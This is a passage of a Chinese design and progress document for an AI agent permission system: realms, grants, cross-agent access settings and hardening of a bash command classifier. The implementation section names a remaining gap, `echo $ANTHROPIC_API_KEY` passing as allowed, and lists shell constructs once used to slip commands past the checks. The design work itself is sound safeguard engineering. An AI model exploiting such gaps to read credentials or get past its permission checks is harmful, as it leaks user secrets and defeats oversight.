- **回归面被低估**:realpath 一开,所有经 symlink 的既有工作目录(软链的项目根、node_modules workspace 链接、`~/data` 挂载)一次性判定越界 —— 必须带开关。

**P3 — 领地与判定链**(体验风险最高)

- Realm 六槽;`resolve(principal, turn)`;skill 四根进 readonly;`agents.json`/`settings.json`/`permissions/**` 进 denied。
- 堵 B5、B6。
- `enforceRead` 开关**只管沙箱内普通 read**;`sensitive_file_read` 与越界 read **恒进判定**(否则观察期那一周敏感文件保护是关着的)。
- 同期删除 `permission-policy.ts:69-72` 的 read 死代码(它会随开关复活,语义与规则 7 冲突)。
- **default agent**:兜底不落它;它的领地等同用户地盘这条仅在**会话确为用户在场的 chat 会话**时成立。

**P4 — Grant 统一**

- **迁移落 `subject: 'user:<userId>'` 而非 `null`**。原方案写 `subject: null`("保持现状语义")= 授予所有主体,正是 §4.4 要消灭的"A 批的 B 用",149KB 历史授权会一次性给到每个 agent。
- P3→P4 之间的窗口:旧 grant 无 subject 时按 `user` 解释(与迁移目标一致),不留无定义区。
- 补上 `authority:'user'` 的持久化与设置页写入点(现状类型允许但全仓无生产写入点)。

**P5 — 工具两轴申报**

- **标 breaking**(原方案标"否",是错的):P5 让 16 个零 analyze 工具开始申报,`send_message`/`board`/`history` 是房面工具地板(`collab/tool-surface.ts:47`),union 进每个房回合;它们一被 deny,**agent 在群里连话都说不出来**,collab 整体停摆。必须与 P3 的非 fs 槽配套,或本期明确"非 fs scheme 只记审计不拦截"。
- 三处越权面收敛(§6.2)。

**P7 — 为 sandbox 预留**

**v2 修订:不做 `Enforcer` 接口**。`in-process` 是唯一实现,`prepare/run/dispose` 三方法零第二消费者,属过度设计。本期只交付一个纯函数:

```ts
export function realmToMountTable(realm: Realm): MountSpec[]
```

与 `agent-sandbox-rust.md` 的关系:那份方案明写"权限不动,sandbox 只改变批准之后在哪里跑",边界落在 `bash-executor.ts` 的 `BashOperations` 那一刀。它今天缺的正是**"往 guest 里挂哪些目录"的权威来源**——`Realm` 就是。等真有第二个执行后端时,再把接口长出来。

---

## 11. 拍板记录与待定项

### 已拍板(2026-08-05)

**① agent 越界默认 `deny`。** 规则 12 的 agent 分支取 `deny`,`escalation: 'deny'` 为 agent 定义的默认值。理由:多 agent 并发下弹窗会淹没用户;agent 越界多半是走错路,`guidance` 让它改道比问用户更有效。单个 agent 可显式开 `ask`,但**不能调掉规则 2/3**。

**② 跨 agent 访问「可以,但要可配置」。** 落成三档策略而非硬编码:

```ts
settings.permissions.crossAgentAccess:
  | 'settings-only'    // 默认 —— 只有设置页显式创建的 authority:'user' grant 能开洞
  | 'prompt-allowed'   // 聊天里弹窗批的 user-prompt grant 也能开洞
  | 'disabled'         // 任何 grant 都不能越过规则 2,他人 private 绝对隔离
```

规则 2 的"可否越过"随该档位变;`dangerously-allow-all` 在**任何档位下都不能越过**(它是模式不是授权)。每条跨 agent grant 独立可撤销、可设 `expiresAt`、在双方的 agent 页各显示一次(A 侧显示"我能访问 B",B 侧显示"A 能访问我")。

> 更一般的原则(由 ② 推广):**本方案的每一条策略都必须有配置项,不得硬编码。** 完整配置面见 §12。

### 待定

| # | 问题 | 建议 |
|---|---|---|
| 3 | **read 要不要进判定**? | 要。P3 先只记审计不拦截,看一周真实分布再翻开关。sensitive 与越界 read 恒进判定 |
| 4 | 默认 agent 的领地要多大? | 等同用户地盘,但**仅限用户在场的 chat 会话**;兜底一律落 `system` |
| 5 | **P5 的非 fs scheme**(room/agent/board/net/job)本期进判定还是只记审计? | **只记审计**。否则 collab 停摆风险太大,等审计数据出来再收 |
| 6 | `bash` 的 env 白名单化会不会打断现有工作流? | 会有一些(依赖 `.zshrc` 里 PATH 扩展的命令)。建议 P1 先记审计+告警,一周后再拦 |

---

## 12. 配置面(可配置性是硬要求)

全部收在 `settings.permissions.*`。**每一项新增字段必须同步登记进 `mergeWithDefaults` 白名单**——既有事故:`storage`/`evals` 曾被静默吞掉,`sessionFormat` 开关至今是死的。

| 配置项 | 取值 | 默认 | 期 |
|---|---|---|---|
| `enforceDeclaration` | bool | false → true | P1 |
| `bashStrictParsing` | bool(换行/`$()`/heredoc 降级 ask) | false → true | P1 |
| `envAllowlist` | string[] \| null(null = 全量继承,现状) | null → 白名单 | P1 |
| `enforceFsRealpath` | bool | false → true | P2 |
| `enforceRead` | `'off' \| 'audit' \| 'enforce'` | audit | P3 |
| `agentEscalation` | `'deny' \| 'ask'`(全局默认,agent 可覆盖) | **deny** ✅ | P3 |
| `crossAgentAccess` | `'settings-only' \| 'prompt-allowed' \| 'disabled'` | **settings-only** ✅ | P3 |
| `defaultAgentRealm` | `'user-scope' \| 'restricted'` | user-scope | P3 |
| `grantSchema` | `'v1' \| 'v2'`(存储迁移可回滚,参照 `settings.storage.sessionFormat`) | v1 → v2 | P4 |
| `nonFsSchemes` | `'audit' \| 'enforce'` | audit | P5 |
| `enforceToolScopes` | bool | false → true | P5 |
| `auditRetentionDays` | number | 30 | P6 |

per-agent 覆盖(`agents.json`):`escalation` · `realm.{workspace,readonly,exec,connect}` · `mcpServers`。

---

## 13. 明确不在本方案内

- **不改**四条 ask 桥(unattended / collab 30min 提醒 / 120s 超时 / 普通)。"该不该问"与"问了怎么等"正交,现状是对的。
- **不改** v3 Actor 的三边界宪法。权限是第四条边界,与它们正交。
- **不实现** sandboxd。只保证接入时判定层零改动,并提供它缺的 `Realm → 挂载表`。
- **不解决** pending ask 跨重启存活(`core/permission/index.ts:117` 是内存 Map,重启后进行中的审批全部蒸发、调用方 Promise 永不 settle)。既有缺陷,单独立项。
- **不解决** **external-agents 与 ACP 两条**直连 `Permission.ask` 的路(`app/external-agents/index.ts:106`、`app/acp/permission-bridge.ts:50`)。二者同构,必须一起立项——只点名一条会漏掉一半。

---

## 14. 实施进度

> 这一节是**实况**,不是计划。改完代码必须回来改这里,否则文档就成了它自己批评的那种黑盒。

### 已落地(2026-08-05,未提交)

止血批(M0):六处修复,+244/−35,八个文件 + 22 条回归测试。`bun run typecheck` 干净,定向 335 条测试全绿,`bun run boundary:gate` 无新增。全量套件里的失败项经 stash 对照确认**全部为既有**(shell-mode 与 MCP 两批在途改造)。

| # | 内容 | 落点 | 对应条目 |
|---|---|---|---|
| 1 | 换行成为命令分隔符 | `tools/bash-classifier.ts` `splitShellWords` | §7 B1 |
| 2 | `$()` / 反引号 / `<(…)` / heredoc 降级 ask | 同上,新增 `findOpaqueConstruct` | §7 B1 |
| 3 | `env`/`printenv` 移出只读白名单 | 同上 `READ_ONLY_COMMANDS` | §7 B4 |
| 4 | `getShellEnv(allowlist)` + `settings.tools.bash.envAllowlist`(**默认 null,行为不变**) | `tools/bash-executor.ts`、`app/tools/builtin/bash.ts`、`shared/ipc/tools.ts`、`shared/defaults/settings.ts` | §7 B4 · §12 `envAllowlist` |
| 5 | `tools: []` 在存储层拒绝(不再翻转成"全给") | `agents/store.ts` `requireWritableToolAllowlist` | 姊妹篇 §1.2 坑 ① |
| 6 | 提示词快照过 agent allowlist | `prompts/system-prompt-snapshot.ts` + `app/engine/prompt/system-prompt-snapshot.ts` | 姊妹篇 §4.2 第一处 |

### 未动

- **P0 主体贯通全部**——地基,尚未开工。
- **P1 剩余三条**:B2(零申报即免判定的前置闸)、B8(MCP 资源名带 server)、B9(插件通道搬运 `analyze`)。
- **P2–P7 全部**。
- §11 待定项 3/4/5/6 仍待拍板。

### 已落地部分留下的口子

- `echo $ANTHROPIC_API_KEY` 仍 allow:变量展开的头部是 `echo`,不属于不可解析构造。按变量名做模式匹配不可靠,唯一的解是打开 `envAllowlist`(第 4 项已备好机制,默认关)。
- 第 4 项默认 `null` 是有意的:错的白名单会以难诊断的方式炸掉工具链(nvm/pyenv 的 PATH shim、`gh` 的 `GH_TOKEN`、代理变量),而那种破坏会让人直接把开关关掉。开启配方见 §12。
